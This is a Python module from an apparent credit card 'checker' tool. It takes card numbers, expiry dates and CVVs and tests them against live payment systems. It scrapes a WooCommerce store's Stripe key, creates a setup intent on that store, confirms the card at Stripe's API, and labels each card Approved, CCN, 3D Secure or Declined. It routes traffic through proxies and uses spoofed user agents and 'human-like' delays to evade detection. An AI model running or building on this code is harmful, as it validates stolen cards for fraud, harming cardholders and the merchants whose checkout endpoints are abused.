"""
Stripe Auth Gateway - WooCommerce Payment Method Verification
Supports generic WooCommerce Stripe integration with setup intent confirmation
Enhanced with dynamic Stripe key extraction and BIN lookup
"""

import os
import requests
import re
import json
import random
import string
import time
from bs4 import BeautifulSoup
from faker import Faker
from urllib.parse import urljoin
from tools.bin_lookup import get_card_info
from gates.utilities import http_request, REQUEST_TIMEOUT
from gates.stripe_payment_intent import process_payment_intent

fake = Faker()

# Cache for store keys to avoid repeated extractions
_key_cache = {}

def _extract_stripe_key_from_page(store_url, session=None):
    """
    Extract Stripe publishable key from store page
    Looks for common patterns in page HTML/JS
    """
    if store_url in _key_cache:
        return _key_cache[store_url]
    
    try:
        if session is None:
            session = requests.Session()
        
        # Try to fetch the add-payment-method or checkout page
        urls_to_try = [
            f"{store_url}/my-account/add-payment-method/",
            f"{store_url}/checkout/",
            f"{store_url}/",
        ]
        
        for url in urls_to_try:
            try:
                resp = http_request('GET', url, session=session, timeout=REQUEST_TIMEOUT, verify=False)
                if resp.status_code != 200:
                    continue
                
                # Search for Stripe key patterns
                patterns = [
                    r'pk_live_[a-zA-Z0-9]+',
                    r'"key":"(pk_live_[a-zA-Z0-9]+)"',
                    r'data-stripe-key="(pk_live_[a-zA-Z0-9]+)"',
                    r'stripe\.setPublishableKey\(["\']?(pk_live_[a-zA-Z0-9]+)["\']?\)',
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, resp.text)
                    if matches:
                        key = matches[0]
                        _key_cache[store_url] = key
                        return key
            except (ValueError, KeyError, AttributeError, requests.RequestException) as e:
                continue
        
        return None
    except (ValueError, KeyError, AttributeError, requests.RequestException) as e:
        return None

def stripe_auth_check(card_num, card_mon, card_yer, card_cvc, store_url=None, proxy=None):
    """
    Check card on WooCommerce Stripe setup intent endpoint
    Tries Payment Intent API first, falls back to setup intent flow.
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV
        store_url: Optional store URL to extract keys from (default: shopzone.nz)
        proxy: Proxy connection string
    
    Returns: (status, proxy_live)
    Status can be: "Approved", "CCN", "Declined", "3D Secure"
    """
    # Try Payment Intent first
    try:
        result = process_payment_intent(card_num, card_mon, card_yer, card_cvc, proxy=proxy, timeout=30)
        if result and "APPROVED" in result.upper():
            return (result, True)
    except Exception:
        pass  # Fall through to original implementation
    
    # Fall back to original setup intent flow
    return _stripe_auth_check_original(card_num, card_mon, card_yer, card_cvc, store_url=store_url, proxy=proxy)


def _stripe_auth_check_original(card_num, card_mon, card_yer, card_cvc, store_url=None, proxy=None):
    try:
        proxies = None
        if proxy:
            proxy_parts = proxy.split(":")
            if len(proxy_parts) == 4:
                proxies = {
                    "http": f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
                    "https": f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                }
            else:
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        # Normalize year to 2-digit format
        if len(card_yer) == 4:
            card_yer = card_yer[2:]

        session = requests.Session()
        session.verify = False
        if proxies:
            session.proxies = proxies

        # Determine target store
        if not store_url:
            store_url = "https://shopzone.nz"
        
        # Ensure https
        if not store_url.startswith(('http://', 'https://')):
            store_url = f"https://{store_url}"

        # Step 1: Request setup intent
        setup_url = f"{store_url}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent"
        
        headers = {
            "User-Agent": fake.user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Referer": f"{store_url}/my-account/add-payment-method/",
        }
        
        time.sleep(random.uniform(0.3, 0.8))  # Human-like delay
        
        setup_response = http_request(
            'POST',
            setup_url,
            session=session,
            data={"payment_method": "stripe_cc"},
            headers=headers,
            timeout=REQUEST_TIMEOUT,
        )

        if setup_response.status_code != 200:
            return ("Declined", False)

        # Extract client secret
        client_secret = None
        secret_intent = None
        
        try:
            resp_json = setup_response.json()
            if 'client_secret' in resp_json:
                client_secret = resp_json['client_secret']
                secret_intent = client_secret.split('_secret_')[0]
            else:
                # Fallback to text parsing
                if 'client_secret' in setup_response.text:
                    client_secret = setup_response.text.split('{"client_secret":"')[1].split('"}')[0]
                    secret_intent = client_secret.split('_secret_')[0]
        except (IndexError, KeyError, json.JSONDecodeError):
            return ("Declined", False)
        
        if not client_secret or not secret_intent:
            return ("Declined", False)

        # Step 2: Extract Stripe key or use fallback
        stripe_key = _extract_stripe_key_from_page(store_url, session)
        
        # Fallback key if extraction fails (requires STRIPE_FALLBACK_PK env var)
        if not stripe_key:
            stripe_key = os.environ.get("STRIPE_FALLBACK_PK", "")

        # Step 3: Confirm setup intent with card
        time.sleep(random.uniform(0.5, 1.0))  # Human-like delay
        
        confirm_data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_num,
            "payment_method_data[card][cvc]": card_cvc,
            "payment_method_data[card][exp_month]": card_mon,
            "payment_method_data[card][exp_year]": card_yer,
            "payment_method_data[billing_details][address][postal_code]": "10080",
            "use_stripe_sdk": "true",
            "key": stripe_key,
            "client_secret": client_secret
        }

        confirm_headers = {
            "User-Agent": fake.user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Referer": setup_url,
            "Origin": store_url,
        }

        confirm_response = http_request(
            'POST',
            f"https://api.stripe.com/v1/setup_intents/{secret_intent}/confirm",
            session=session,
            data=confirm_data,
            headers=confirm_headers,
            timeout=REQUEST_TIMEOUT,
        )

        if confirm_response.status_code != 200:
            # Try to get error info
            try:
                err_json = confirm_response.json()
                error_msg = err_json.get("error", {}).get("message", "").lower()
                if "cvc" in error_msg or "cvv" in error_msg:
                    return ("CCN", True)
            except:
                pass
            return ("Declined", False)

        response_json = confirm_response.json()
        response_text = json.dumps(response_json).lower()
        
        # Get BIN info for enhanced output
        bin_info = get_card_info(card_num)
        bin_display = f" ({bin_info['formatted']})" if bin_info['brand'] != 'Unknown' else ""

        # Determine status
        if response_json.get("status") == "succeeded":
            return (f"Approved ✅{bin_display}", True)
        
        if "incorrect_cvc" in response_text or "cvc_check" in response_text:
            return (f"CCN{bin_display}", True)
        
        if response_json.get("status") == "requires_action":
            return (f"3D Secure{bin_display}", True)
        
        # Check error codes
        error_msg = response_json.get("error", {}).get("message", "").lower()
        if "declined" in error_msg:
            return (f"Declined{bin_display}", False)
        if "cvc" in error_msg or "cvv" in error_msg:
            return (f"CCN{bin_display}", True)
        
        return (f"Declined{bin_display}", False)

    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except requests.exceptions.ConnectionError:
        return ("DECLINED ❌ Connection failed", False)
    except Exception as e:
        return (f"Error: {str(e)[:40]}", False)
